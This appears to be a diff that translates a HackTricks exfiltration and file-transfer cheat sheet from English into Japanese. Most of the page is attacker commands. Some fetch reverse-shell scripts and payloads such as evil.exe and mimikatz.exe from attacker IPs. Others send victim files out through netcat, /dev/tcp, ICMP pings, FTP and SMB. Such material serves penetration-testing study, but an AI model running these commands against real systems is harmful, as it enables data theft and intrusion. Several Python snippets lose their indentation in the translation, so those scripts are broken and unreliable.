@@ -2,39 +2,32 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Commonly whitelisted domains to exfiltrate information
+## 情報を抽出するための一般的にホワイトリストに登録されたドメイン
 
-Check [https://lots-project.com/](https://lots-project.com/) to find commonly whitelisted domains that can be abused
+[https://lots-project.com/](https://lots-project.com/) を確認して、悪用できる一般的にホワイトリストに登録されたドメインを見つけてください。
 
 ## Copy\&Paste Base64
 
 **Linux**
-
 ```bash
 base64 -w0 <file> #Encode file
 base64 -d file #Decode file
 ```
-
-**Windows**
-
+**ウィンドウズ**
 ```
 certutil -encode payload.dll payload.b64
 certutil -decode payload.b64 payload.dll
 ```
-
 ## HTTP
 
 **Linux**
-
 ```bash
 wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
 wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
 curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
 fetch 10.10.14.14:8000/shell.py #FreeBSD
 ```
-
-**Windows**
-
+**ウィンドウズ**
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
 bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf
@@ -49,13 +42,11 @@ Start-BitsTransfer -Source $url -Destination $output
 #OR
 Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ```
-
-### Upload files
+### ファイルのアップロード
 
 - [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
-- [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
-- Python module [uploadserver](https://pypi.org/project/uploadserver/):
-
+- [**GETおよびPOST（ヘッダーも含む）を印刷するSimpleHttpServer**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
+- Pythonモジュール [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
 python3 -m pip install --user uploadserver
@@ -68,9 +59,7 @@ curl -X POST http://HOST/upload -H -F 'files=@file.txt'
 # With basic auth:
 # curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
 ```
-
-### **HTTPS Server**
-
+### **HTTPSサーバー**
 ```python
 # from https://gist.github.com/dergachev/7028596
 # taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
@@ -105,31 +94,25 @@ from urllib.parse import quote
 app = Flask(__name__)
 @app.route('/')
 def root():
-    print(request.get_json())
-    return "OK"
+print(request.get_json())
+return "OK"
 if __name__ == "__main__":
-    app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
+app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ###
 ```
-
 ## FTP
 
-### FTP server (python)
-
+### FTPサーバー (python)
 ```bash
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
 ```
-
-### FTP server (NodeJS)
-
+### FTPサーバー (NodeJS)
 ```
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
 ```
-
-### FTP server (pure-ftp)
-
+### FTPサーバー (pure-ftp)
 ```bash
 apt-get update && apt-get install pure-ftp
 ```
@@ -147,9 +130,7 @@ mkdir -p /ftphome
 chown -R ftpuser:ftpgroup /ftphome/
 /etc/init.d/pure-ftpd restart
 ```
-
-### **Windows** client
-
+### **Windows** クライアント
 ```bash
 #Work well with python. With pure-ftp use fusr:ftp
 echo open 10.11.0.41 21 > ftp.txt
@@ -160,37 +141,31 @@ echo GET mimikatz.exe >> ftp.txt
 echo bye >> ftp.txt
 ftp -n -v -s:ftp.txt
 ```
-
 ## SMB
 
-Kali as server
-
+Kaliをサーバーとして
 ```bash
 kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
 kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-
 Or create a smb share **using samba**:
-
 ```bash
 apt-get install samba
 mkdir /tmp/smb
 chmod 777 /tmp/smb
 #Add to the end of /etc/samba/smb.conf this:
 [public]
-    comment = Samba on Ubuntu
-    path = /tmp/smb
-    read only = no
-    browsable = yes
-    guest ok = Yes
+comment = Samba on Ubuntu
+path = /tmp/smb
+read only = no
+browsable = yes
+guest ok = Yes
 #Start samba
 service smbd restart
 ```
-
-Windows
-
+ウィンドウズ
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -198,54 +173,42 @@ CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentia
 WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
 WindPS-2> cd new_disk:
 ```
-
 ## SCP
 
-The attacker has to have SSHd running.
-
+攻撃者はSSHdを実行している必要があります。
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
-
 ## SSHFS
 
-If the victim has SSH, the attacker can mount a directory from the victim to the attacker.
-
+もし被害者がSSHを持っている場合、攻撃者は被害者のディレクトリを攻撃者にマウントすることができます。
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
 sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
 ```
-
 ## NC
-
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
 ```
-
 ## /dev/tcp
 
-### Download file from victim
-
+### 被害者からファイルをダウンロードする
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-
-### Upload file to victim
-
+### 被害者にファイルをアップロードする
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
 exec 6< /dev/tcp/10.10.10.10/4444
 cat <&6 > file.txt
 ```
-
-thanks to **@BinaryShadow\_**
+**@BinaryShadow\_** に感謝
 
 ## **ICMP**
-
 ```bash
 # To exfiltrate the content of a file via pings you can do:
 xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
@@ -256,64 +219,50 @@ xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attack
 from scapy.all import *
 #This is ippsec receiver created in the HTB machine Mischief
 def process_packet(pkt):
-    if pkt.haslayer(ICMP):
-        if pkt[ICMP].type == 0:
-            data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
-            print(f"{data.decode('utf-8')}", flush=True, end="")
+if pkt.haslayer(ICMP):
+if pkt[ICMP].type == 0:
+data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
+print(f"{data.decode('utf-8')}", flush=True, end="")
 
 sniff(iface="tun0", prn=process_packet)
 ```
-
 ## **SMTP**
 
-If you can send data to an SMTP server, you can create an SMTP to receive the data with python:
-
+SMTPサーバーにデータを送信できる場合、Pythonを使用してデータを受信するSMTPを作成できます:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
-
 ## TFTP
 
-By default in XP and 2003 (in others it needs to be explicitly added during installation)
+デフォルトでは、XPおよび2003では（他のバージョンではインストール時に明示的に追加する必要があります）
 
-In Kali, **start TFTP server**:
-
+Kaliで、**TFTPサーバーを起動**：
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
 atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
-
-**TFTP server in python:**
-
+**PythonでのTFTPサーバー:**
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-
-In **victim**, connect to the Kali server:
-
+**被害者**で、Kaliサーバーに接続します:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
-
 ## PHP
 
-Download a file with a PHP oneliner:
-
+PHPワンライナーを使用してファイルをダウンロードします:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
-
 ## VBScript
-
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
-
-**Victim**
-
+**犠牲者**
 ```bash
 echo strUrl = WScript.Arguments.Item(0) > wget.vbs
 echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
@@ -345,23 +294,16 @@ echo ts.Close >> wget.vbs
 ```bash
 cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
-
 ## Debug.exe
 
-The `debug.exe` program not only allows inspection of binaries but also has the **capability to rebuild them from hex**. This means that by providing an hex of a binary, `debug.exe` can generate the binary file. However, it's important to note that debug.exe has a **limitation of assembling files up to 64 kb in size**.
-
+`debug.exe` プログラムはバイナリの検査だけでなく、**16進数からそれらを再構築する能力**も持っています。これは、バイナリの16進数を提供することで、`debug.exe` がバイナリファイルを生成できることを意味します。ただし、debug.exe には**最大64 kbのサイズのファイルをアセンブルする制限**があることに注意することが重要です。
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-
-Then copy-paste the text into the windows-shell and a file called nc.exe will be created.
-
-- [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
+その後、テキストをウィンドウズシェルにコピー＆ペーストすると、nc.exeというファイルが作成されます。
 
 ## DNS
-
-- [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
 
 {{#include ../banners/hacktricks-training.md}}
